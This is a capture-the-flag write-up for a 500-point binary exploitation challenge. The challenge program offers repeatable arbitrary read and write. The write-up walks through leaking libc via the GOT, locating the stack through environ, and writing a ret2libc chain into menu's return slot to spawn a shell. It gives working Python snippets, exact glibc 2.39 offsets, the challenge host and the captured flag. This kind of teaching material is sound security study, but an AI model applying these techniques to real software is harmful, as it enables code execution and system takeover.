# Prims — Pwn (500 pts)

> It's arbitraryslop. You only like it because you can read or write whatever you want with it.
> `nc 45.77.247.35 22003`

**Flag:** `CYBLTZ2026{c10aafab12aff2a722e312825dfdb78055453e481ca4bf0d1613fc04134b768d}`

## The binary

```
Partial RELRO | No canary | NX enabled | No PIE | glibc 2.39 (Ubuntu 2.39-0ubuntu8.9)
```

Source was provided, and it is exactly what the description says — a menu handing you two
primitives, forever:

```c
void arbread(void) {
  unsigned char* loc;
  printf("[?] address > ");
  read(0, &loc, sizeof(loc));
  printf("[!] arbread: ");
  for (int i = 0; i < 8; i++) printf("%02x", loc[i]);
}

void arbwrite(void) {
  unsigned char* loc;
  read(0, &loc, 8);          // where
  read(0, loc, 8);           // what
}

int main(void) { ...; while (1) menu(); }
```

So: an 8-byte arbitrary read and an 8-byte arbitrary write, repeatable. No PIE means the GOT is
at a known address, so this is a straightforward leak-and-redirect — the only interesting parts
are a byte-order trap and a write-ordering trap.

## Gotcha 1 — the leak is printed in memory order

`arbread` prints `loc[0]`, `loc[1]`, … `loc[7]` as `%02x`. That is **little-endian byte order**,
not the value. Parsing the hex string as a big-endian integer gives garbage:

```python
int(data, 16)                                        # 0xc07c4896e07f0000  ✗ nonsense
int.from_bytes(bytes.fromhex(data.decode()), "little")  # 0x00007fe09648... ✓
```

The quick sanity check is that a correct libc base is page-aligned — `base & 0xfff == 0`.

## Step 1 — libc base

Read `puts@GOT` (`0x404000`) and subtract the symbol offset:

```python
base = rd(p, 0x404000) - libc.symbols["puts"]      # puts @ 0x87cc0
```

## Step 2 — a stack address

`environ` in libc points at the stack, so one more arbitrary read gives us the stack:

```python
env = rd(p, base + 0x20bd58)                        # libc environ
```

## Step 3 — find `menu()`'s saved return address

Rather than hardcode an offset, scan **down** from `environ` (towards lower addresses, i.e.
newer frames) looking for the known return value — `main` calls `menu` at `0x40133f`, so the
saved return address on the stack is `0x401344`:

```python
for off in range(0, 0x900, 8):
    if rd(p, env - off) == 0x401344:
        ret_slot = env - off
        break
```

## Gotcha 2 — write the return slot *last*

`main` is `while (1) menu();`, so **every** iteration pushes a fresh return address into
`ret_slot`. Anything written there is overwritten on the next menu call. The frame slots *above*
it (`ret_slot+8`, `+0x10`, `+0x18`) belong to `main`'s frame and are stable.

So write the chain body first, then the entrypoint:

```python
chain = [base+POP_RDI, base+BINSH, base+RET, base+SYSTEM]
for i in (1, 2, 3):
    wr(p, ret_slot + 8*i, chain[i])    # stable slots
wr(p, ret_slot, chain[0])              # LAST — consumed immediately on return
```

As soon as `arbwrite` returns, `menu` returns into `pop rdi; ret` and the chain fires.

A `ret` gadget is included for the usual glibc `movaps` 16-byte stack alignment requirement in
`system`.

## Offsets used (provided libc, glibc 2.39)

| symbol | offset |
|---|---|
| `puts` | `0x87cc0` |
| `system` | `0x58750` |
| `/bin/sh` | `0x1cc42f` |
| `environ` | `0x20bd58` |
| `pop rdi; ret` | `0x10c08d` |
| `ret` | `0x28a92` |

## Why not a one_gadget?

Tried first, and all six candidates failed. Overwriting a GOT entry (`printf`, `getc`, `puts`)
with a one_gadget crashed every time — the register constraints (`rbp-0x50` / `r12` / `[rbp-0x78]`
being NULL) simply aren't satisfied at those call sites. The `environ` → stack → ret2libc route
is deterministic and needs no luck, which is the right call when you already have an unlimited
arbitrary read.

## Exploit

Full script: [`tools/prims_solve.py`](../../tools/prims_solve.py)

```
$ python3 prims_solve.py remote 45.77.247.35 22003
uid=10001(ctf) gid=10001(ctf) groups=10001(ctf)
flag.txt
CYBLTZ2026{c10aafab12aff2a722e312825dfdb78055453e481ca4bf0d1613fc04134b768d}
```

Tested locally first against the provided libc/loader with `patchelf --set-interpreter
./ld-linux-x86-64.so.2 --set-rpath . main`.
